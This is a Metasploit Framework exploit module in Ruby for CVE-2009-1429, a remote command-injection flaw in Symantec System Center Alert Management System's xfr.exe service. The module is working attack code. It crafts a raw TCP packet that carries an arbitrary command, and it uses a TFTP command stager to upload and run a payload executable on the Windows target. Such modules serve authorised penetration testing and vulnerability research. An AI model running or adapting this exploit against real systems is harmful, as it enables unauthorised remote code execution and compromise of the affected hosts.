##
# $Id: ams_xfr.rb 13591 2011-08-19 18:35:29Z mc $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote

	Rank = ExcellentRanking

	include Msf::Exploit::CmdStagerTFTP
	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Symantec System Center Alert Management System (xfr.exe) Arbitrary Command Execution',
			'Description'    => %q{
					Symantec System Center Alert Management System is prone to a remote command-injection vulnerability
					because the application fails to properly sanitize user-supplied input.
			},
			'Author'         => [ 'MC' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 13591 $',
			'References'     =>
				[
					[ 'CVE', '2009-1429' ],
					[ 'BID', '34671' ],
					[ 'OSVDB', '54157' ],
					[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-09-060/' ],
					[ 'URL', 'http://www.symantec.com/business/security_response/securityupdates/detail.jsp?fid=security_advisory&pvid=security_advisory&suid=20090428_02' ]
				],
			'Targets'       =>
				[
					[ 'Windows Universal',
						{
							'Arch' => ARCH_X86,
							'Platform' => 'win'
						}
					]
				],
			'Privileged' => 'true',
			'Platform' => 'win',
			'DefaultTarget' => 0,
			'DisclosureDate' => 'Apr 28 2009'))

		register_options(
			[
				Opt::RPORT(12174),
				OptString.new('CMD', [ false, 'Execute this command instead of using command stager', ""]),
			], self.class)
	end

	def windows_stager

		exe_fname = rand_text_alphanumeric(4+rand(4)) + ".exe"

		print_status("Sending request to #{datastore['RHOST']}:#{datastore['RPORT']}")
		execute_cmdstager({ :temp => '.'})
		@payload_exe = payload_exe

		print_status("Attempting to execute the payload...")
		execute_command(@payload_exe)

	end

	def execute_command(cmd, opts = {})

		connect

			len  = 2 + cmd.length

			data =  [0x00000000].pack('V')
			data << len.chr
			data << "\x00"
			data << cmd + " "
			data << "\x00"

			sock.put(data)

			res = sock.get_once

				if (!res)
					print_error("Did not recieve data. Failed?")
				else
					print_status("Got data, execution successful!")
				end

		disconnect
		
	end

	def exploit

		if not datastore['CMD'].empty?
			print_status("Executing command '#{datastore['CMD']}'")
			execute_command(datastore['CMD'])
			return
		end

		case target['Platform']
			when 'win'
				windows_stager
			else
				raise RuntimeError, 'Target not supported.'
			end

		handler

	end
end

